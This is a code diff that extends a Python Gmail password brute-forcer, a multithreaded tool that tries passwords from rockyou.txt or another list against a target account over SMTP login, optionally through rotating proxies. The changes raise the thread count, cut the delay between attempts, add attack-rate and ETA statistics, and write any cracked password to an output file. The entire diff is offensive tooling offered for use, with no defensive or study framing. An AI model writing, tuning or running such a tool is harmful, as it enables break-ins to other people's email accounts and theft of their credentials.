@@ -43,8 +43,8 @@ class AdvancedGmailBruteForcer:
         self.max_delay = float(self.config.get('DEFAULT', 'max_delay', fallback=8))
         self.retry_attempts = int(self.config.get('DEFAULT', 'retry_attempts', fallback=3))
         self.connection_timeout = int(self.config.get('DEFAULT', 'connection_timeout', fallback=30))
-        self.max_threads = int(self.config.get('DEFAULT', 'max_threads', fallback=5))
-        self.thread_delay = float(self.config.get('DEFAULT', 'thread_delay', fallback=1))
+        self.max_threads = int(self.config.get('DEFAULT', 'max_threads', fallback=15))
+        self.thread_delay = float(self.config.get('DEFAULT', 'thread_delay', fallback=0.5))
         self.use_proxy = self.config.getboolean('DEFAULT', 'use_proxy', fallback=False)
         self.proxy_rotation = self.config.getboolean('DEFAULT', 'proxy_rotation', fallback=True)
         self.proxy_timeout = int(self.config.get('DEFAULT', 'proxy_timeout', fallback=10))
@@ -66,7 +66,11 @@ class AdvancedGmailBruteForcer:
         
         # Statistics
         self.attempts = 0
+        self.successful_attempts = 0
+        self.failed_attempts = 0
         self.start_time = None
+        self.last_update_time = None
+        self.passwords_per_minute = 0
         
     def setup_logging(self):
         """Setup logging configuration"""
@@ -75,9 +79,9 @@ class AdvancedGmailBruteForcer:
         
         logging.basicConfig(
             level=getattr(logging, log_level),
-            format='%(asctime)s - %(levelname)s - %(message)s',
+            format='%(asctime)s - [%(threadName)s] - %(levelname)s - %(message)s',
             handlers=[
-                logging.FileHandler(log_file),
+                logging.FileHandler(f"logs/{log_file}"),
                 logging.StreamHandler()
             ]
         )
@@ -183,9 +187,15 @@ class AdvancedGmailBruteForcer:
                 if not self.found_password:
                     self.found_password = password
                     self.stop_threads = True
+                    self.successful_attempts += 1
                     
             print(f"{Fore.GREEN}[SUCCESS] Password Found: {password}{Style.RESET_ALL}")
-            self.logger.info(f"Password found: {password}")
+            self.logger.info(f"SUCCESS: Password found for {username}: {password}")
+            self.logger.info(f"Attack duration: {time.time() - self.start_time:.2f} seconds")
+            self.logger.info(f"Total attempts before success: {self.attempts}")
+            
+            # Save successful result to output file
+            self.save_result(username, password)
             
             smtpserver.quit()
             return True
@@ -193,27 +203,28 @@ class AdvancedGmailBruteForcer:
         except smtplib.SMTPAuthenticationError:
             with self.lock:
                 self.attempts += 1
-            print(f"{Fore.RED}[FAIL] Thread-{thread_id}: {password}{Style.RESET_ALL}")
-            self.logger.debug(f"Failed password: {password}")
+                self.failed_attempts += 1
+            print(f"{Fore.RED}[FAIL] Thread-{thread_id}: {password} (Attempt: {self.attempts}){Style.RESET_ALL}")
+            self.logger.debug(f"Failed password attempt {self.attempts}: {password}")
             
         except smtplib.SMTPServerDisconnected as e:
-            self.logger.warning(f"SMTP server disconnected: {e}")
+            self.logger.warning(f"Thread-{thread_id}: SMTP server disconnected: {e}")
             time.sleep(random.uniform(10, 20))
             
         except smtplib.SMTPRecipientsRefused as e:
-            self.logger.error(f"Recipients refused: {e}")
+            self.logger.error(f"Thread-{thread_id}: Recipients refused: {e}")
             
         except smtplib.SMTPSenderRefused as e:
-            self.logger.error(f"Sender refused: {e}")
+            self.logger.error(f"Thread-{thread_id}: Sender refused: {e}")
             
         except smtplib.SMTPDataError as e:
-            self.logger.error(f"SMTP data error: {e}")
+            self.logger.error(f"Thread-{thread_id}: SMTP data error: {e}")
             
         except socket.timeout:
-            self.logger.warning(f"Connection timeout with proxy: {proxy}")
+            self.logger.warning(f"Thread-{thread_id}: Connection timeout with proxy: {proxy}")
             
         except Exception as e:
-            self.logger.error(f"Unexpected error: {e}")
+            self.logger.error(f"Thread-{thread_id}: Unexpected error: {e}")
             
         finally:
             try:
@@ -226,11 +237,16 @@ class AdvancedGmailBruteForcer:
         
     def worker_thread(self, username, thread_id):
         """Worker thread for password attempts"""
-        self.logger.info(f"Thread-{thread_id} started")
+        thread_start_time = time.time()
+        thread_attempts = 0
+        
+        self.logger.info(f"Thread-{thread_id} started for target: {username}")
         
         while not self.stop_threads and not self.password_queue.empty():
             try:
                 password = self.password_queue.get(timeout=1)
+                thread_attempts += 1
+                
                 if self.attempt_login(username, password, thread_id):
                     break
                     
@@ -241,7 +257,11 @@ class AdvancedGmailBruteForcer:
                 self.logger.error(f"Thread-{thread_id} error: {e}")
                 break
                 
-        self.logger.info(f"Thread-{thread_id} finished")
+        thread_duration = time.time() - thread_start_time
+        thread_rate = thread_attempts / thread_duration if thread_duration > 0 else 0
+        
+        self.logger.info(f"Thread-{thread_id} finished - Duration: {thread_duration:.2f}s, "
+                        f"Attempts: {thread_attempts}, Rate: {thread_rate:.2f}/sec")
         
     def load_passwords(self, password_file):
         """Load passwords from file"""
@@ -260,17 +280,51 @@ class AdvancedGmailBruteForcer:
             self.logger.error(f"Password file not found: {password_file}")
             return []
             
+    def save_result(self, username, password):
+        """Save successful result to output file"""
+        try:
+            output_file = f"output/successful_login_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+            with open(output_file, 'w') as f:
+                f.write(f"=== SUCCESSFUL BRUTE FORCE ATTACK ===\n")
+                f.write(f"Target: {username}\n")
+                f.write(f"Password: {password}\n")
+                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write(f"Total attempts: {self.attempts}\n")
+                f.write(f"Attack duration: {time.time() - self.start_time:.2f} seconds\n")
+            self.logger.info(f"Result saved to: {output_file}")
+        except Exception as e:
+            self.logger.error(f"Failed to save result: {e}")
+            
     def print_statistics(self):
         """Print current statistics"""
         if self.start_time:
-            elapsed = time.time() - self.start_time
+            current_time = time.time()
+            elapsed = current_time - self.start_time
             rate = self.attempts / elapsed if elapsed > 0 else 0
             
-            print(f"\n{Fore.CYAN}=== Statistics ==={Style.RESET_ALL}")
-            print(f"Attempts: {self.attempts}")
-            print(f"Elapsed: {elapsed:.2f}s")
-            print(f"Rate: {rate:.2f} attempts/sec")
-            print(f"Remaining: {self.password_queue.qsize()}")
+            # Calculate passwords per minute
+            if elapsed > 0:
+                self.passwords_per_minute = (self.attempts * 60) / elapsed
+            
+            # Calculate ETA
+            remaining = self.password_queue.qsize()
+            eta_seconds = remaining / rate if rate > 0 else 0
+            eta_minutes = eta_seconds / 60
+            
+            print(f"\n{Fore.CYAN}=== Real-time Statistics ==={Style.RESET_ALL}")
+            print(f"Attack Duration: {elapsed:.2f}s ({elapsed/60:.1f} minutes)")
+            print(f"Total Attempts: {self.attempts}")
+            print(f"Failed Attempts: {self.failed_attempts}")
+            print(f"Attack Rate: {rate:.2f} attempts/sec")
+            print(f"Passwords/Minute: {self.passwords_per_minute:.1f}")
+            print(f"Remaining: {remaining} passwords")
+            print(f"ETA: {eta_minutes:.1f} minutes")
+            print(f"Active Threads: {sum(1 for t in self.threads if t.is_alive())}")
+            print(f"Proxy Mode: {'Enabled' if self.use_proxy else 'Disabled'}")
+            
+            # Log detailed statistics
+            self.logger.info(f"STATS - Elapsed: {elapsed:.2f}s, Attempts: {self.attempts}, "
+                           f"Rate: {rate:.2f}/sec, Remaining: {remaining}, ETA: {eta_minutes:.1f}min")
             
     def brute_force_attack(self, username, passwords):
         """Main brute force attack with threading"""
@@ -284,6 +338,15 @@ class AdvancedGmailBruteForcer:
         print(f"Total passwords: {len(passwords)}")
         print(f"Using {self.max_threads} threads")
         print(f"Proxy enabled: {self.use_proxy}")
+        print(f"Attack started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+        
+        # Log attack start
+        self.logger.info(f"=== BRUTE FORCE ATTACK STARTED ===")
+        self.logger.info(f"Target: {username}")
+        self.logger.info(f"Wordlist size: {len(passwords)} passwords")
+        self.logger.info(f"Threads: {self.max_threads}")
+        self.logger.info(f"Proxy mode: {self.use_proxy}")
+        self.logger.info(f"Start time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
         
         # Start worker threads
         for i in range(self.max_threads):
@@ -311,6 +374,25 @@ class AdvancedGmailBruteForcer:
             thread.join(timeout=2)
             
         # Final statistics
+        print(f"\n{Fore.CYAN}=== FINAL ATTACK SUMMARY ==={Style.RESET_ALL}")
+        final_elapsed = time.time() - self.start_time
+        final_rate = self.attempts / final_elapsed if final_elapsed > 0 else 0
+        
+        print(f"Attack completed at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+        print(f"Total duration: {final_elapsed:.2f}s ({final_elapsed/60:.1f} minutes)")
+        print(f"Total attempts: {self.attempts}")
+        print(f"Failed attempts: {self.failed_attempts}")
+        print(f"Average rate: {final_rate:.2f} attempts/sec")
+        print(f"Final passwords/minute: {(self.attempts * 60) / final_elapsed:.1f}")
+        
+        # Log final statistics
+        self.logger.info(f"=== ATTACK COMPLETED ===")
+        self.logger.info(f"End time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+        self.logger.info(f"Total duration: {final_elapsed:.2f} seconds")
+        self.logger.info(f"Total attempts: {self.attempts}")
+        self.logger.info(f"Success rate: {(self.successful_attempts/self.attempts)*100 if self.attempts > 0 else 0:.2f}%")
+        self.logger.info(f"Average attack rate: {final_rate:.2f} attempts/sec")
+        
         self.print_statistics()
         
         return self.found_password is not None
@@ -339,7 +421,7 @@ def main():
     password_list_option = input("'0' for rockyou.txt\n'1' for other list\n: ")
     
     if password_list_option == '0':
-        password_file = "rockyou.txt"
+        password_file = "wordlists/rockyou.txt"
     elif password_list_option == '1':
         password_file = input("Enter the file path for the password list: ")
     else:
